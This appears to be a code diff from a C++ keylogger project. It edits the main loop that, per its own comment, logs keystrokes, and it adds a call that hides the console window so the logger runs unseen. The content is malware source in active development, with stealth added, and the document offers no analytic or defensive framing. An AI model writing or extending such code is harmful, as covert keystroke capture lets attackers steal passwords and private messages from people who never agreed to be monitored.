@@ -1,5 +1,6 @@
 #include "logManager.h"
 #include "keyLogger.h"
+#include "windowManager.h"
 
 #define ITERATION_DELAY 120
 
@@ -9,8 +10,10 @@ int main()
 {
     char key = 0;
 
-    logManager* manager = logManager::getLogManager();
-    manager->createLogFile();
+    logManager* manager = NULL;
+
+    windowManager::hideConsoleWindow();
+
     // Mainloop that logs the keystrokes.
     while(TRUE)
     {
@@ -21,5 +24,3 @@ int main()
     }
 	return 0;
 }
-
-
